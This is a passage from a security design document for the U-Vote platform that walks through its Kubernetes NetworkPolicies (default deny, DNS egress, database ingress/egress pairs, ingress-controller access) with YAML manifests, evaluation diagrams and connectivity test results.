  │  Layer 2: Database (02-allow-to-database.yaml)           │
  │  Effect: Allow DB access for 6 services                  │
  │  Policies: 2 (ingress + egress)                          │
  ├─────────────────────────────────────────────────────────┤
  │  Layer 3: Ingress (03-allow-from-ingress.yaml)           │
  │  Effect: Allow external access to 6 services             │
  │  Policies: 6 (one per exposed service)                   │
  ├─────────────────────────────────────────────────────────┤
  │  Layer 4: Audit (04-allow-audit.yaml)                    │
  │  Effect: Allow audit log delivery from backend services  │
  │  Policies: 2 (ingress + egress)                          │
  └─────────────────────────────────────────────────────────┘

  Total: 12 NetworkPolicy resources across 5 YAML files
```

The numeric prefixes (00, 01, 02, 03, 04) establish a logical ordering but do
not affect policy evaluation priority. Kubernetes NetworkPolicies are additive —
all policies that select a given pod are evaluated, and traffic is allowed if
*any* policy permits it. The ordering is purely for human readability and
operational consistency.

#### 4.1.3 Policy Evaluation

Kubernetes NetworkPolicy evaluation follows these rules:

1. **Additive (Union)**: If multiple policies select the same pod, the effective
   policy is the union of all matching policies. A pod's ingress is allowed if
   *any* matching policy allows the source/port combination.

2. **Default Behaviour**: If no NetworkPolicy selects a pod for a given direction
   (ingress or egress), all traffic in that direction is allowed. However, once
   *any* policy selects a pod for a direction, only traffic matching that policy
   (or other policies selecting the same pod) is allowed.

3. **Policy Types**: A policy's `policyTypes` field determines which directions
   it affects. The default-deny policy specifies both `Ingress` and `Egress`,
   meaning it affects both directions for all pods (via the empty `podSelector`).

4. **No Explicit Deny**: Kubernetes NetworkPolicies cannot express explicit deny
   rules. Security is achieved through the absence of allow rules, not through
   the presence of deny rules. The default-deny policy creates the baseline by
   selecting all pods without specifying any allow rules, effectively denying
   everything.

For the U-Vote platform, the evaluation flow for a given packet is:

```
Policy Evaluation Flow:

  Packet: Auth Service → PostgreSQL:5432

  Step 1: Find all policies selecting auth-service pod for Egress
          ├── 00-default-deny (matches: podSelector {})  → no egress rules → DENY
          ├── 01-allow-dns (matches: podSelector {})     → allows port 53 → NO MATCH (port 5432)
          ├── 02b-allow-database-egress (matches)        → allows postgresql:5432 → MATCH
          └── 04b-allow-audit-egress (matches)           → allows audit:8005 → NO MATCH (port 5432)

  Result: ALLOWED (02b matches)

  Step 2: Find all policies selecting postgresql pod for Ingress
          ├── 00-default-deny (matches: podSelector {})  → no ingress rules → DENY
          └── 02a-allow-to-database (matches)            → allows auth-service:5432 → MATCH

  Result: ALLOWED (02a matches)

  Final: Packet is permitted (both egress and ingress matched)
```

#### 4.1.4 Label-Based Selection

NetworkPolicies identify pods through label selectors, not through IP addresses,
service names, or DNS names. This label-based approach provides several advantages:

- **Dynamic**: Policies automatically apply to new pods that match the selector
  labels, without requiring policy updates.
- **Identity-Based**: Policies are tied to the workload's identity (its labels),
  not its network address. This aligns with zero-trust principles where identity
  determines access.
- **Scalable**: A policy selecting `app: auth-service` applies to all replicas
  of the Auth service, whether there is one pod or one hundred.

The U-Vote services use the following labels for NetworkPolicy selection:

| Service | Primary Label | Used By Policies |
|---------|--------------|------------------|
| Frontend | `app: frontend` | 03 (ingress) |
| Auth Service | `app: auth-service` | 02 (db), 03 (ingress), 04 (audit) |
| Election Service | `app: election-service` | 02 (db), 03 (ingress), 04 (audit) |
| Voting Service | `app: voting-service` | 02 (db), 03 (ingress), 04 (audit) |
| Results Service | `app: results-service` | 02 (db), 03 (ingress), 04 (audit) |
| Audit Service | `app: audit-service` | 02 (db), 04 (audit ingress) |
| Admin Service | `app: admin-service` | 02 (db), 03 (ingress), 04 (audit) |
| Email Service | `app: email-service` | 04 (audit) |
| PostgreSQL | `app: postgresql` | 02 (db ingress) |

The `namespaceSelector` is used in two contexts:
- `01-allow-dns.yaml`: Selects the `kube-system` namespace for DNS egress
- `03-allow-from-ingress.yaml`: Selects the `ingress-nginx` namespace for
  ingress traffic

### 4.2 Policy-by-Policy Analysis

This section provides a detailed analysis of each NetworkPolicy resource deployed
in the U-Vote platform. For each policy, the full YAML manifest is presented
alongside a comprehensive breakdown of its purpose, scope, effect, security
rationale, testing evidence, and maintenance considerations.

---

#### Policy 00: Default Deny

**File:** `00-default-deny.yaml`
**Policy Name:** `default-deny`
**Category:** Baseline Security

##### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    policy-order: "00"
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

##### Purpose

The `default-deny` policy establishes the security baseline for the entire
`uvote-dev` namespace. Its purpose is to block all network traffic — both
incoming (ingress) and outgoing (egress) — for every pod in the namespace. This
creates a "zero trust" starting point where no communication is possible until
explicitly authorised by subsequent policies.

##### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `{}` (empty) | Matches ALL pods in the namespace |
| Policy Types | Ingress, Egress | Affects both incoming and outgoing traffic |
| Ingress Rules | None (empty) | No ingress traffic is allowed |
| Egress Rules | None (empty) | No egress traffic is allowed |

The empty `podSelector: {}` is the key mechanism. In Kubernetes NetworkPolicy
semantics, an empty pod selector matches every pod in the policy's namespace.
Combined with the `policyTypes` field listing both `Ingress` and `Egress`, and
the absence of any `ingress` or `egress` rule blocks, this policy denies all
traffic in both directions for all pods.

##### Effect

When this policy is the only NetworkPolicy in the namespace, the following
effects are observed:

| Traffic Type | Effect | Reason |
|-------------|--------|--------|
| Pod → Pod (same namespace) | BLOCKED | No egress rule on source, no ingress rule on destination |
| Pod → Pod (cross-namespace) | BLOCKED | No egress rule on source |
| Pod → External internet | BLOCKED | No egress rule on source |
| External → Pod | BLOCKED | No ingress rule on destination |
| Pod → DNS (kube-system) | BLOCKED | No egress rule on source |
| Pod → Kubernetes API | BLOCKED | No egress rule on source |

This means that with only the default-deny policy applied:
- Services cannot resolve DNS names (cannot find the database by hostname)
- Services cannot connect to the database (no TCP connectivity to port 5432)
- Services cannot receive HTTP requests (no ingress from any source)
- Services cannot send audit events (no egress to the Audit service)
- Services cannot make any outbound connections (no egress at all)

The namespace is effectively air-gapped from all network communication.

##### Security Rationale

The default-deny policy implements the following security principles:

1. **Fail-Secure Default**: Without this policy, Kubernetes allows all pod-to-pod
   communication by default. A missing or misconfigured allow policy would result
   in unrestricted access. With the default-deny policy, a missing allow policy
   results in no access — the secure failure mode.

2. **Explicit Authorisation**: Every subsequent policy (01 through 04) must
   explicitly define what traffic it permits. This forces the security architect
   to consciously consider and document every allowed communication path.

3. **CIS Compliance**: CIS Kubernetes Benchmark control 5.3.2 states: "Ensure
   that all Namespaces have Network Policies defined." The default-deny policy
   satisfies this control by ensuring that a baseline policy exists for all pods.

4. **Zero-Trust Foundation**: NIST SP 800-207 requires that access is denied by
   default and granted only through explicit policy. The default-deny policy is
   the literal implementation of this requirement.

5. **Lateral Movement Prevention**: In the event of a pod compromise, the attacker
   inherits only the network permissions explicitly granted to that pod. Without
   the default-deny policy, a compromised pod could freely communicate with every
   other pod in the cluster.

##### Label Analysis

The policy includes three metadata labels that serve organisational and
operational purposes:

| Label | Value | Purpose |
|-------|-------|---------|
| `app` | `uvote` | Identifies this policy as part of the U-Vote application |
| `security` | `network-policy` | Categorises this resource as a security control |
| `policy-order` | `"00"` | Indicates this is the first policy in the application order |

These labels enable bulk operations such as:
- `kubectl get networkpolicy -l app=uvote` — list all U-Vote network policies
- `kubectl get networkpolicy -l security=network-policy` — list all security policies
- `kubectl get networkpolicy -l policy-order=00` — retrieve this specific policy

##### Testing Evidence

The default-deny policy was tested by applying it as the sole NetworkPolicy and
verifying that all traffic was blocked:

**Test: All traffic blocked with default deny**
- **Method**: Applied `00-default-deny.yaml` only. Attempted DNS resolution,
  HTTP requests between services, and database connections.
- **Expected Result**: All communication fails (timeout or connection refused).
- **Actual Result**: All communication failed. DNS resolution timed out. HTTP
  requests between pods timed out. Database connection attempts timed out.
- **Status**: PASS

The test confirms that the default-deny policy is effective and that no other
mechanism (e.g., a cluster-level policy or CNI default) is overriding it.

##### Exceptions

There are no exceptions to the default-deny policy. It applies to every pod in
the `uvote-dev` namespace without condition. All traffic — including health
checks from the kubelet, which originate from the node's IP address outside the
pod network — is subject to this policy.

Note: In practice, kubelet health checks (liveness and readiness probes) may
still function depending on the Calico configuration, as some Calico deployments
exempt host-networked traffic from NetworkPolicy enforcement. This is a
Calico-specific behaviour, not a Kubernetes NetworkPolicy specification.

##### Maintenance Notes

- This policy should be the **first** policy applied to the namespace and the
  **last** policy removed. Removing it without the other policies in place would
  restore Kubernetes' default allow-all behaviour.
- Modifying the `podSelector` (e.g., adding labels) would narrow the scope of
  the deny, potentially exposing pods that are not selected. The empty selector
  should never be changed.
- This policy has no dependencies on other policies and no other policies depend
  on it for functionality. However, all other policies depend on it conceptually
  — without the default deny, the allow policies would be redundant (traffic
  would be allowed by default anyway).

---

#### Policy 01: Allow DNS

**File:** `01-allow-dns.yaml`
**Policy Name:** `allow-dns`
**Category:** Infrastructure — Service Discovery

##### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: dns
    policy-order: "01"
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

##### Purpose

The `allow-dns` policy restores DNS resolution capability for all pods in the
`uvote-dev` namespace. After the default-deny policy blocks all traffic, this is
the first allow policy applied because DNS is a prerequisite for all other
communication — services cannot connect to `postgresql` or `audit-service` by
name without first resolving those names to IP addresses.

This policy permits egress traffic to the `kube-system` namespace on port 53
(both UDP and TCP), which is where CoreDNS runs. It does not permit ingress
(CoreDNS responses are allowed by connection tracking / stateful inspection
in iptables) and does not permit egress to any other destination or port.

##### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `{}` (empty) | Matches ALL pods in the namespace |
| Policy Types | Egress | Affects outgoing traffic only |
| Egress Destination | `kube-system` namespace | Only DNS servers in kube-system |
| Egress Ports | 53/UDP, 53/TCP | Standard DNS ports only |

##### Effect

When this policy is applied alongside the default-deny policy, the following
changes are observed:

| Traffic Type | Before (deny only) | After (deny + DNS) | Reason |
|-------------|--------------------|--------------------|--------|
| Pod → CoreDNS (UDP 53) | BLOCKED | ALLOWED | DNS egress rule matches |
| Pod → CoreDNS (TCP 53) | BLOCKED | ALLOWED | DNS egress rule matches |
| CoreDNS → Pod (response) | BLOCKED | ALLOWED | Conntrack allows return traffic |
| Pod → PostgreSQL (5432) | BLOCKED | BLOCKED | No egress rule for port 5432 |
| Pod → Any other port | BLOCKED | BLOCKED | Only port 53 is allowed |
| Pod → External DNS | BLOCKED | BLOCKED | Only kube-system namespace allowed |
| Any → Pod (ingress) | BLOCKED | BLOCKED | Policy is egress-only |

The critical observation is that DNS resolution now works, but no other
connectivity is restored. Services can resolve `postgresql.uvote-dev.svc.cluster.local`
to an IP address, but they cannot establish TCP connections to that IP address.
This was confirmed in testing.

##### DNS Resolution Flow with Policy Applied

```
DNS Resolution with allow-dns Policy:

  Auth Service Pod                    CoreDNS Pod
  (uvote-dev namespace)               (kube-system namespace)
       │                                    │
       │  1. UDP packet to port 53          │
       │  Src: 192.168.x.a:random          │
       │  Dst: 10.96.0.10:53               │
       │                                    │
       │  Policy check (egress):            │
       │  ├── 00-default-deny: no match     │
       │  └── 01-allow-dns: MATCH           │
       │       (kube-system ns, port 53)    │
       │                                    │
       │────────────────────────────────────▶│
       │                                    │
       │  2. DNS response (conntrack)        │
       │  Src: 10.96.0.10:53               │
       │  Dst: 192.168.x.a:random          │
       │                                    │
       │  Policy check (ingress):           │
       │  Conntrack: RELATED,ESTABLISHED    │
       │  → ALLOWED (stateful return)       │
       │                                    │
       │◀────────────────────────────────────│
       │                                    │
       │  3. Auth service now knows          │
       │  postgresql = 192.168.y.b          │
       │  BUT cannot connect (no egress     │
       │  policy for port 5432 yet)         │
```

##### Security Rationale

1. **Minimal DNS Exposure**: The policy restricts DNS egress to the `kube-system`
   namespace only, identified by the well-known label
   `kubernetes.io/metadata.name: kube-system`. This prevents pods from sending
   DNS queries to arbitrary external DNS servers, which could be used for:
   - **DNS exfiltration**: Encoding sensitive data in DNS query names sent to an
     attacker-controlled DNS server
   - **DNS tunnelling**: Using DNS as a covert communication channel to bypass
     network restrictions
   - **DNS rebinding**: Resolving internal service names to attacker-controlled
     IP addresses

2. **Protocol Restriction**: Only port 53 is allowed, and only for UDP and TCP.
   This prevents the `kube-system` namespace selector from being exploited to
   access other services running in `kube-system` (e.g., the Kubernetes API
   server, etcd, or kube-proxy) on their respective ports.

3. **Namespace Selector Security**: The `namespaceSelector` uses the label
   `kubernetes.io/metadata.name: kube-system`, which is automatically applied by
   Kubernetes and cannot be set by non-admin users. This prevents an attacker from
   creating a rogue namespace with matching labels to intercept DNS traffic.

4. **Both UDP and TCP**: DNS typically uses UDP, but TCP is required for:
   - Responses exceeding 512 bytes (the traditional UDP DNS limit)
   - DNSSEC-signed responses (which are larger than unsigned responses)
   - DNS over TCP fallback when UDP is unreliable
   Omitting TCP could cause intermittent DNS failures for large responses.

5. **Egress-Only**: The policy only grants egress (outgoing) permissions. It does
   not create an ingress rule on pods in `kube-system`. CoreDNS responses are
   allowed by the Linux kernel's connection tracking (conntrack) subsystem, which
   recognises them as return packets for an established UDP "connection." This is
   a standard stateful firewall behaviour implemented by iptables.

##### Label Analysis

| Label | Value | Purpose |
|-------|-------|---------|
| `app` | `uvote` | Identifies this policy as part of U-Vote |
| `security` | `network-policy` | Categorises as a security control |
| `purpose` | `dns` | Describes the functional purpose of this policy |
| `policy-order` | `"01"` | Indicates this is the second policy (after default deny) |

The `purpose: dns` label is unique to this policy and enables targeted queries:
- `kubectl get networkpolicy -l purpose=dns` — retrieve DNS-related policies

##### Testing Evidence

The DNS policy was tested by applying it alongside the default-deny policy and
verifying that DNS resolution works while other traffic remains blocked:

**Test: DNS resolution works after policy application**
- **Method**: Applied `00-default-deny.yaml` and `01-allow-dns.yaml`. Executed
  DNS lookup for `postgresql.uvote-dev.svc.cluster.local` from a pod in the
  namespace.
- **Expected Result**: DNS resolution succeeds, returning the ClusterIP of the
  postgresql Service.
- **Actual Result**: DNS resolution succeeded. The pod was able to resolve
  service names to ClusterIP addresses.
- **Status**: PASS

**Test: Database connectivity still blocked after DNS policy**
- **Method**: With default-deny and DNS policies applied, attempted a TCP
  connection from a service pod to `postgresql:5432`.
- **Expected Result**: Connection times out (DNS resolves, but TCP to 5432 is
  blocked by the still-active default deny).
- **Actual Result**: DNS resolution succeeded, but the TCP connection to port
  5432 timed out. The pod could resolve the database hostname but could not
  establish a connection.
- **Status**: PASS

These tests confirm that the DNS policy provides exactly the intended capability
(name resolution) without inadvertently opening additional communication paths.

##### Exceptions

The DNS policy applies to all pods in the `uvote-dev` namespace (empty
`podSelector`). There are no exceptions — every pod, including PostgreSQL, is
granted DNS egress. This is intentional because:

- PostgreSQL may need DNS for internal operations (e.g., hostname-based
  authentication in `pg_hba.conf`)
- Future services added to the namespace will automatically have DNS access
- Restricting DNS to specific pods would add policy complexity without meaningful
  security benefit, since DNS queries to CoreDNS do not expose sensitive data

##### Maintenance Notes

- This policy should be applied immediately after the default-deny policy.
  Applying database or ingress policies without DNS will cause service failures,
  as pods will be unable to resolve service names.
- If CoreDNS is moved to a different namespace (e.g., during a cluster upgrade),
  the `namespaceSelector` must be updated to match the new namespace label.
- The `kubernetes.io/metadata.name` label is immutable and managed by Kubernetes.
  It cannot be spoofed by creating a namespace with a custom label of the same
  name, as the label value is always set to the namespace's actual name.
- If external DNS resolution is required in the future (e.g., for the Email
  service to resolve SMTP server hostnames), an additional egress policy would
  need to be created for that specific service, targeting the external DNS
  server's IP address or allowing broader egress for that pod only.

---

#### Policy 02: Database Access Control

**Files:** `02-allow-database.yaml`
**Policy Names:** `allow-to-database` (02a — Ingress), `allow-database-egress` (02b — Egress)
**Category:** Data Layer — Database Access Control

The database access control policy is implemented as a **bidirectional pair**: one
ingress policy on the PostgreSQL pod and one egress policy on the application service
pods. Both policies must be present for database connectivity to function. This
bidirectional design ensures that even if one policy were accidentally removed,
database access would remain blocked — the ingress policy alone would prevent
services from sending traffic, and the egress policy alone would prevent the
database from receiving traffic.

##### Policy 02a: allow-to-database (Ingress)

###### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-to-database
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: database-access
    policy-order: "02a"
spec:
  podSelector:
    matchLabels:
      app: postgresql
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: auth-service
    - podSelector:
        matchLabels:
          app: voting-service
    - podSelector:
        matchLabels:
          app: election-service
    - podSelector:
        matchLabels:
          app: results-service
    - podSelector:
        matchLabels:
          app: audit-service
    - podSelector:
        matchLabels:
          app: admin-service
    ports:
    - protocol: TCP
      port: 5432
```

###### Purpose

The `allow-to-database` policy controls which pods are permitted to send traffic
to the PostgreSQL database pod on port 5432. It is applied to the PostgreSQL pod
via the `app: postgresql` label selector and uses an ingress rule to whitelist
exactly six application services that require database access.

This policy is the ingress half of the database access control pair. Without it,
no pod in the namespace could connect to PostgreSQL, even if the egress policy
(02b) were in place, because the default-deny policy blocks all ingress.

###### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `app: postgresql` | Targets only the PostgreSQL pod |
| Policy Types | Ingress | Affects incoming traffic to PostgreSQL only |
| Ingress Sources | 6 named services | auth, voting, election, results, audit, admin |
| Ingress Ports | 5432/TCP | PostgreSQL wire protocol only |

###### Effect

When this policy is applied alongside the default-deny and DNS policies:

| Source Pod | Destination | Port | Result | Reason |
|-----------|-------------|------|--------|--------|
| auth-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: auth-service` |
| voting-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: voting-service` |
| election-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: election-service` |
| results-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: results-service` |
| audit-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: audit-service` |
| admin-service | postgresql | 5432 | ALLOWED | Ingress rule matches `app: admin-service` |
| frontend | postgresql | 5432 | BLOCKED | No ingress rule for `app: frontend` |
| email-service | postgresql | 5432 | BLOCKED | No ingress rule for `app: email-service` |
| Unlabelled pod | postgresql | 5432 | BLOCKED | No matching label selector |
| auth-service | postgresql | 80 | BLOCKED | Port 80 not in allowed ports list |

###### Security Rationale — Defence in Depth

The network policy is the first layer of database protection, but it is not the
only layer. The U-Vote platform employs a defence-in-depth strategy for database
security:

1. **Network Layer (this policy):** Only six named services can reach port 5432
   on the PostgreSQL pod. The Frontend and Email services cannot connect at all.
2. **Authentication Layer:** Each of the six services connects with its own
   dedicated database user (e.g., `auth_service`, `voting_service`). There is no
   shared `app` user or superuser account.
3. **Authorisation Layer:** Each database user is granted only the minimum SQL
   permissions required. For example, `results_service` has `SELECT` only — it
   cannot `INSERT`, `UPDATE`, or `DELETE` any row.
4. **Data Integrity Layer:** Database triggers prevent modification or deletion
   of cast votes, and hash-chaining provides tamper detection.

If a service were compromised, the attacker would be constrained by both the
network policy (limiting which pods can talk to the database) and the database
permissions (limiting what SQL operations the compromised service's user can
perform). For example, even if the Results service were fully compromised, the
attacker could only execute `SELECT` statements — they could not modify votes,
create elections, or escalate privileges.

###### Service-Specific Database Access

The following table details what each service does with its database access and
why that access is necessary:

| Service | DB User | Operations | Tables Accessed | Business Justification |
|---------|---------|------------|-----------------|----------------------|
| auth-service | `auth_service` | SELECT, INSERT, UPDATE | admins | Admin authentication and credential management |
| voting-service | `voting_service` | INSERT (votes), SELECT (elections, candidates), SELECT/UPDATE (voting_tokens) | votes, elections, candidates, voting_tokens | Cast votes, validate elections, consume tokens |
| election-service | `election_service` | SELECT, INSERT, UPDATE, DELETE | elections | Full CRUD lifecycle for election management |
| results-service | `results_service` | SELECT only | votes, elections, candidates | Read-only access for result tabulation |
| audit-service | `audit_service` | INSERT, SELECT | audit_logs | Write audit entries and retrieve audit history |
| admin-service | `admin_service` | SELECT, INSERT, UPDATE, DELETE | voters, candidates, voting_tokens | Full CRUD for voter/candidate registration |

###### What Is Blocked and Why

| Source | Reason for Blocking |
|--------|-------------------|
| **frontend** | The Frontend is a Next.js application that communicates with backend services via HTTP API calls. It has no need for direct database access. All data retrieval and mutation flows through the appropriate backend service. Allowing frontend-to-database traffic would bypass all application-level validation, authentication, and authorisation. |
| **email-service** | The Email service receives trigger requests from other services (e.g., "send a voting token email") and dispatches emails via SMTP. It does not read from or write to the database. Audit logging of email events is handled by the calling service, not the email service itself. |
| **Unlabelled pods** | Any pod without an `app` label matching one of the six allowed values is denied. This prevents ad-hoc debug pods, compromised containers, or misconfigured deployments from accessing the database. |

---

##### Policy 02b: allow-database-egress (Egress)

###### Full YAML Manifest

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-database-egress
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: database-access
    policy-order: "02b"
spec:
  podSelector:
    matchExpressions:
    - key: app
      operator: In
      values:
      - auth-service
      - voting-service
      - election-service
      - results-service
      - audit-service
      - admin-service
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: postgresql
    ports:
    - protocol: TCP
      port: 5432
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

###### Purpose

The `allow-database-egress` policy is the egress half of the database access
control pair. It permits the six database-consuming services to send outbound
traffic to the PostgreSQL pod on port 5432, and to CoreDNS on port 53 for name
resolution.

This policy uses `matchExpressions` with the `In` operator rather than individual
`podSelector` entries. This is a deliberate design choice: instead of creating
six separate egress policies (one per service), a single policy selects all six
services simultaneously. This reduces the total policy count while maintaining
the same level of granularity — only the named services are selected, and only
port 5432 to PostgreSQL is permitted.

###### Scope

| Attribute | Value | Explanation |
|-----------|-------|-------------|
| Namespace | `uvote-dev` | Applies only within the application namespace |
| Pod Selector | `matchExpressions: app In [6 services]` | Targets all six DB-consuming services |
| Policy Types | Egress | Affects outgoing traffic from the selected services |
| Egress Destination 1 | `app: postgresql` on port 5432/TCP | Database connections |
| Egress Destination 2 | `kube-system` on port 53/UDP+TCP | DNS resolution |

###### Effect

When this policy is applied alongside 02a, the default-deny, and the DNS policy:

| Source Pod | Destination | Port | Result | Reason |
|-----------|-------------|------|--------|--------|
| auth-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| voting-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| election-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| results-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| audit-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| admin-service | postgresql | 5432 | ALLOWED | Egress matches (also requires 02a ingress) |
| auth-service | CoreDNS | 53 | ALLOWED | DNS egress rule in this policy |
| frontend | postgresql | 5432 | BLOCKED | Not in `matchExpressions` values list |
| email-service | postgresql | 5432 | BLOCKED | Not in `matchExpressions` values list |
| auth-service | external-host | 443 | BLOCKED | No egress rule for port 443 or external targets |

###### Why DNS Is Included in the Egress Policy

The `allow-database-egress` policy includes a DNS egress rule despite the
existence of the global `allow-dns` policy (01). This is intentional and serves
a defensive purpose:

When multiple egress policies target the same pod, Kubernetes takes the **union**
of all allowed destinations. However, if the global DNS policy were accidentally
removed during maintenance, services that only had Policy 02b would lose DNS
resolution unless 02b independently allows it. Including DNS in 02b provides
redundancy for this critical infrastructure dependency.

Additionally, having the DNS rule in the same policy as the database rule makes
the policy self-documenting: a reader can see that these services need both
database access and DNS resolution to function.

###### Bidirectional Requirement

Database connectivity requires both policies to be active simultaneously. The
following diagram illustrates why:

```
Bidirectional Database Access Control:

  auth-service Pod                                    postgresql Pod
  ┌──────────────────┐                               ┌──────────────────┐
  │                  │                               │                  │
  │  02b: Egress     │──── TCP SYN to :5432 ────────▶│  02a: Ingress    │
  │  allows outbound │                               │  allows inbound  │
  │  to postgresql   │                               │  from auth-svc   │
  │                  │◀─── TCP SYN-ACK ──────────────│                  │
  │                  │     (conntrack return)         │                  │
  │                  │                               │                  │
  └──────────────────┘                               └──────────────────┘

  Without 02a: SYN packet arrives at postgresql pod but is DROPPED by
               default-deny ingress. Connection times out.

  Without 02b: SYN packet never leaves auth-service pod. DROPPED by
               default-deny egress. Connection times out.

  Without both: No connectivity in either direction. Default-deny blocks all.

  With both:   Full TCP connection established. PostgreSQL queries work.
```

###### Testing Evidence

Testing confirmed the bidirectional requirement:

**Test 1 — Allowed service (auth-service) connects to PostgreSQL:**
```
$ kubectl exec -n uvote-dev deploy/auth-service -- \
    pg_isready -h postgresql -p 5432
postgresql:5432 - accepting connections
```
Result: Connection succeeded. Both 02a (ingress) and 02b (egress) matched.

**Test 2 — Blocked service (frontend) cannot connect to PostgreSQL:**
```
$ kubectl exec -n uvote-dev deploy/frontend -- \
    nc -zv -w 3 postgresql 5432
nc: connect to postgresql (10.96.x.x) port 5432 (tcp) timed out: Operation timed out
```
Result: Connection timed out. Frontend is not listed in either 02a or 02b.

**Test 3 — Unlabelled test pod cannot connect to PostgreSQL:**
```
$ kubectl run test-pod --rm -it --image=busybox -n uvote-dev -- \
    nc -zv -w 3 postgresql 5432
nc: connect to postgresql (10.96.x.x) port 5432 (tcp) timed out: Operation timed out
```
Result: Connection timed out. Test pod has no `app` label matching any allowed value.

###### Maintenance Notes

- When adding a new service that requires database access, **both** policies must
  be updated: add a new `podSelector` entry to 02a and add the new service name
  to the `matchExpressions` values list in 02b.
- When removing a service, remove it from both policies to maintain consistency.
  Leaving a stale entry in one policy is not a security risk (the other policy
  would still block traffic) but creates confusion during audits.
- The `matchExpressions` approach in 02b means all six services share the same
  egress destination (postgresql:5432). If a future service needs database access
  on a different port, a separate policy would be required.
- The order of `podSelector` entries in 02a's `from` list does not affect
  evaluation — Kubernetes evaluates all entries and allows if any match.

---

#### Policy 03: Ingress Controller Access

**File:** `03-allow-ingress.yaml`
**Policy Names:** Six individual policies (one per exposed service)
**Category:** External Access — API Gateway Layer

##### Architecture Overview

The U-Vote platform uses an NGINX Ingress Controller deployed in the
`ingress-nginx` namespace to route external HTTP traffic to backend services. The
Ingress Controller acts as the single entry point for all client-facing traffic,
implementing an API Gateway pattern:

```
External Traffic Flow:

  Browser / Client
       │
       │ HTTPS (port 443)
       ▼
  ┌─────────────────────────────────────────────────────────┐
  │  Kind Cluster - Node Port                               │
  │       │                                                 │
  │       ▼                                                 │
  │  ┌──────────────────────────────────┐                   │
  │  │  ingress-nginx namespace         │                   │
  │  │  ┌────────────────────────────┐  │                   │
  │  │  │  NGINX Ingress Controller  │  │                   │
  │  │  │  (Pod)                     │  │                   │
  │  │  └────────────┬───────────────┘  │                   │
  │  └───────────────┼──────────────────┘                   │
  │                  │                                      │
  │    ┌─────────────┼──── Cross-Namespace Traffic ────┐    │
  │    │             ▼    (uvote-dev namespace)         │    │
  │    │                                               │    │
  │    │  ┌──────────┐  ┌──────────┐  ┌──────────┐    │    │
  │    │  │ frontend │  │ auth-svc │  │elect-svc │    │    │
  │    │  │  :3000   │  │  :8001   │  │  :8002   │    │    │
  │    │  └──────────┘  └──────────┘  └──────────┘    │    │
  │    │                                               │    │
  │    │  ┌──────────┐  ┌──────────┐  ┌──────────┐    │    │
  │    │  │vote-svc  │  │rslt-svc  │  │admin-svc │    │    │
  │    │  │  :8003   │  │  :8004   │  │  :8006   │    │    │
  │    │  └──────────┘  └──────────┘  └──────────┘    │    │
  │    │                                               │    │
  │    │  ┌──────────┐  ┌──────────┐  ┌──────────┐    │    │
  │    │  │audit-svc │  │email-svc │  │ postgres │    │    │
  │    │  │  :8005   │  │  :8007   │  │  :5432   │    │    │
  │    │  │ NOT      │  │ NOT      │  │ NOT      │    │    │
  │    │  │ EXPOSED  │  │ EXPOSED  │  │ EXPOSED  │    │    │
  │    │  └──────────┘  └──────────┘  └──────────┘    │    │
  │    └───────────────────────────────────────────────┘    │
  └─────────────────────────────────────────────────────────┘
```

Of the nine pods in the namespace, only **six** are exposed through the Ingress
Controller. Three services — audit-service, email-service, and postgresql — are
**not** accessible from outside the cluster and have no corresponding ingress
policy for external access.

##### Per-Service Ingress Policies

Six NetworkPolicy resources are defined, one for each externally accessible
service. Each policy allows ingress from the `ingress-nginx` namespace on the
service's specific port:

| Policy Name | Target Service | Target Port | Path Pattern |
|------------|---------------|-------------|-------------|
| `allow-ingress-frontend` | frontend | 3000/TCP | `/` (root, serves Next.js UI) |
| `allow-ingress-auth` | auth-service | 8001/TCP | `/api/auth/*` |
| `allow-ingress-election` | election-service | 8002/TCP | `/api/elections/*` |
| `allow-ingress-voting` | voting-service | 8003/TCP | `/api/voting/*` |
| `allow-ingress-results` | results-service | 8004/TCP | `/api/results/*` |
| `allow-ingress-admin` | admin-service | 8006/TCP | `/api/admin/*` |

##### Representative YAML — Frontend Ingress Policy

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-ingress-frontend
  namespace: uvote-dev
  labels:
    app: uvote
    security: network-policy
    purpose: ingress-access
    policy-order: "03"
spec:
  podSelector:
    matchLabels:
      app: frontend
  policyTypes:
  - Ingress
  ingress:
